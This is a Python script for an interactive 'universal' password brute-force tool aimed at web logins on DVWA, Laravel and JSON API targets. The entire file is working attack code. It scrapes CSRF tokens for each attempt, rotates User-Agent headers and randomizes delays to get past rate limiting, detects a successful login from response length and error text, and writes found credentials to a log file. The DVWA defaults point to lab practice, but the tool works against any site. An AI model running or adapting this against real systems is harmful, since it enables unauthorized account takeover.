#!/usr/init/env python3
# -*- coding: utf-8 -*-
import os
import time
import random
import requests
from bs4 import BeautifulSoup

# Disable SSL warnings for local/self-signed HTTPS targets
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def main():
    print("===============================================")
    print("    UNIVERSAL MULTI-TARGET BRUTE-FORCE TOOL    ")
    print("===============================================")

    # --- TARGET / FRAMEWORK SELECTION ---
    print(" [1] DVWA / PHP Native Standard (Username & user_token)")
    print(" [2] Laravel / Modern Web Framework (Email & _token)")
    print(" [3] Custom / API JSON Payload")
    mode_target = input("[?] Select Target Mode [1-3] (default 1): ").strip()
    if not mode_target:
        mode_target = '1'

    # --- PARAMETER SETUP BASED ON MODE ---
    if mode_target == '2':
        default_user_param = 'email'
        default_pass_param = 'password'
        default_token_param = '_token'
        default_path = '/login'
    elif mode_target == '3':
        default_user_param = 'username'
        default_pass_param = 'password'
        default_token_param = ''
        default_path = '/api/login'
    else:
        default_user_param = 'username'
        default_pass_param = 'password'
        default_token_param = 'user_token'
        default_path = '/vulnerabilities/brute/'

    # --- INTERACTIVE INPUTS ---
    target = input(f"[?] Input Target URL (default http://127.0.0.1:8000): ").strip()
    if not target:
        target = "http://127.0.0.1:8000"

    path_target = input(f"[?] Input target path (default {default_path}): ").strip()
    if not path_target:
        path_target = default_path

    url = target.rstrip('/') + '/' + path_target.lstrip('/')

    method_choice = input("[?] Select Request Method [1] GET [2] POST (default 1): ").strip()
    if not method_choice:
        method = 'GET'
    else:
        method = 'POST' if method_choice == '2' else 'GET'

    user_param = input(f"[?] Username/email parameter name (default {default_user_param}): ").strip()
    if not user_param:
        user_param = default_user_param

    pass_param = input(f"[?] Password parameter name (default {default_pass_param}): ").strip()
    if not pass_param:
        pass_param = default_pass_param

    token_param = input(f"[?] CSRF token parameter name (default {default_token_param}): ").strip()
    if not token_param and mode_target != '3':
        token_param = default_token_param

    user = input("[?] Input target username/email to attack: ").strip()
    pass_file = input("[?] Input passlist filename (e.g., passlist.txt): ").strip()

    success_text = input("[?] Success flag / text (optional, leave blank if none): ").strip()

    delay_input = input("[?] Input base delay between requests in seconds (default 1): ").strip()
    base_delay = float(delay_input) if delay_input else 1.0

    ## OPSI SIMPAN KE FILE LOG
    save_option = input("[?] Simpan hasil BINGO ke file log? (y/n, default n): ").strip().lower()

    if not os.path.exists(pass_file):
        print(f"[-] Error: Passlist file '{pass_file}' not found!")
        return

    print("-----------------------------------------------")

    # Use Session to automatically persist cookies
    session = requests.Session()
    if mode_target == '1':
        session.cookies.set('security', 'high') ## Set cookie security high di awal sesi

    # --- AUTO-LOGIN / INITIAL SESSION SETUP ---
    do_autologin = input("[?] Do you need initial auto-login? (y/n, default n): ").strip().lower()
    if do_autologin == 'y':
        print("[*] Performing initial session setup...")
        login_url = target.rstrip('/') + '/login.php'
        try:
            resp_login_get = session.get(login_url, verify=False, timeout=10)
            soup_login = BeautifulSoup(resp_login_get.text, 'html.parser')

            t_name = 'user_token' if mode_target == '1' else '_token'
            login_token_input = soup_login.find('input', {'name': t_name})
            if not login_token_input:
                login_token_input = soup_login.find('meta', {'name': 'csrf-token'})

            login_token = ""
            if login_token_input:
                login_token = login_token_input.get('value') or login_token_input.get('content', '')

            print("[*] Sending initialization credentials...")
            login_payload = {
                'username': 'admin',
                'password': 'password',
                'Login': 'Login',
                t_name: login_token
            }

            resp = session.post(login_url, data=login_payload, verify=False, timeout=10)
            print("--- [ DEBUG AUTO-LOGIN RESP ] ---")
            print(resp.text[:500])
            print("---------------------------------")
            print("[+] Initial session successfully configured!")
        except Exception as e:
            print(f"[-] Initialization note: {e}")

    ## FIX BASELINE RESPONS GAGAL
    print("[*] Fetching failed response baseline...")
    try:
        r = session.get(url, verify=False, timeout=10)
        soup = BeautifulSoup(r.text, 'html.parser')
        t_input = soup.find('input', {'name': token_param}) if token_param else None
        if not t_input and token_param:
            t_input = soup.find('meta', {'name': 'csrf-token'})

        t_val = ""
        if t_input:
            t_val = t_input.get('value') or t_input.get('content', '')

        fail_payload = {user_param: user, pass_param: "WRONGPASS123!!!"}
        if mode_target == '1':
            fail_payload['Login'] = 'Login'

        if token_param and t_val:
            fail_payload[token_param] = t_val

        if method == 'POST':
            resp_fail = session.post(url, data=fail_payload, verify=False, timeout=10)
        else:
            resp_fail = session.get(url, params=fail_payload, verify=False, timeout=10)

        fail_len = len(resp_fail.text)
    except:
        fail_len = 4345

    print(f"[+] Active Target: {url}")
    print(f"[+] Failed baseline length: {fail_len} bytes")
    print("-----------------------------------------------")

    # Read passlist file with automatic stripping to prevent hidden spaces/newlines
    try:
        with open(pass_file, 'r', encoding='utf-8', errors='ignore') as f:
            passwords = [line.strip() for line in f if line.strip() != ""]
    except Exception as e:
        print(f"[-] Failed to read passlist: {e}")
        return

    # Determine if target is a JSON/API response
    is_json_response = (mode_target == '3')

    # Start brute-force loop
    for password in passwords:
        token_brute = ""

        try:
            # Random User-Agent rotation
            session.headers.update({
                'User-Agent': random.choice([
                    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
                    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15'
                ])
            })

            # 1. Fetch target page to get the latest CSRF token & session cookies
            resp_get = session.get(url, verify=False, timeout=10)

            # 2. Extract dynamic CSRF token using BeautifulSoup
            if token_param:
                soup = BeautifulSoup(resp_get.text, 'html.parser')
                token_input = soup.find('input', {'name': token_param})
                if not token_input:
                    token_input = soup.find('meta', {'name': 'csrf-token'})

                if token_input:
                    token_brute = token_input.get('value') or token_input.get('content', '')

            # 3. Construct payload based on target platform
            payload = {
                user_param: user,
                pass_param: password
            }
            if mode_target == '1':
                payload['Login'] = 'Login'  ## DVWA wajib menyertakan tombol Login

            if token_param and token_brute:
                payload[token_param] = token_brute

            # 4. Send request based on method & format data
            if mode_target == '3':
                resp = session.post(url, json=payload, verify=False, allow_redirects=True, timeout=10)
            else:
                if method == 'POST':
                    resp = session.post(url, data=payload, verify=False, allow_redirects=True, timeout=10)
                else:
                    resp = session.get(url, params=payload, verify=False, allow_redirects=True, timeout=10)

            print(f"\033[31m[-] Trying: {password} (Status: {resp.status_code})\033[0m")

            # 5. VALIDASI SUKSES UNIVERSAL (BERLAPIS / LAYERED)
            lower = resp.text.lower()
            current_len = len(resp.text)
            diff = abs(current_len - fail_len)
            bingo = False
            reason = ""

            # LAYER 1: If user provided a specific flag, it takes highest precedence
            if success_text and success_text.lower() in lower:
                bingo = True
                reason = f"Flag '{success_text}' found"

            # LAYER 2: If target is an API / JSON (mode 3)
            elif is_json_response:
                bingo = '"error"' not in lower and 'invalid' not in lower and resp.status_code == 200 and diff > 10
                reason = "JSON without error"

            # LAYER 3: Regular web form targets (DVWA vs Laravel separation)
            else:
                has_error_text = any(x in lower for x in ["username and/or password incorrect", "incorrect", "invalid", "failed"])

                if mode_target == '1': ## DVWA spesifik (form tetap ada walau gagal)
                    bingo = not has_error_text and (success_text.lower() in lower if success_text else diff > 20)
                    reason = f"DVWA: Error gone={not has_error_text} Diff={diff}"
                else: ## Laravel / Modern framework (Blok else diperbarui total)
                    form_still_exists = 'type="password"' in lower
                    has_success_flag = success_text.lower() in lower if success_text else False
                    has_error_text = any(x in lower for x in ["these credentials do not match", "whoops", "invalid", "failed", "incorrect", "error"])

                    # WAJIB ada dashboard/flag dan form harus hilang, serta tidak ada teks error
                    bingo = has_success_flag and not form_still_exists and not has_error_text
                    reason = f"Laravel: SuccessFlag={has_success_flag} Form gone={not form_still_exists} Error gone={not has_error_text}"

            if bingo:
                print("\n" + "=" * 50)
                print(f"\033[32m[+] BINGO! Password found -> {user} : {password}\033[0m")
                print(f"[+] Status: {resp.status_code} | Reason: {reason}")
                print("=" * 50)

                ## Simpan ke file log jika opsi diaktifkan
                if save_option == 'y':
                    log_filename = "bingo_results.txt"
                    with open(log_filename, 'a', encoding='utf-8') as log_file:
                        log_file.write(f"Target: {url} | User: {user} | Password: {password} | Reason: {reason}\n")
                    print(f"[+] Result successfully saved to {log_filename}")

                break

        except requests.exceptions.RequestException as e:
            print(f"[-] Connection error: {e}")
        except Exception as e:
            print(f"[-] An error occurred: {e}")

        # Randomized delay to prevent rate limiting
        actual_delay = base_delay + random.uniform(0.2, 1.2)
        time.sleep(actual_delay)

if __name__ == '__main__':
    main()
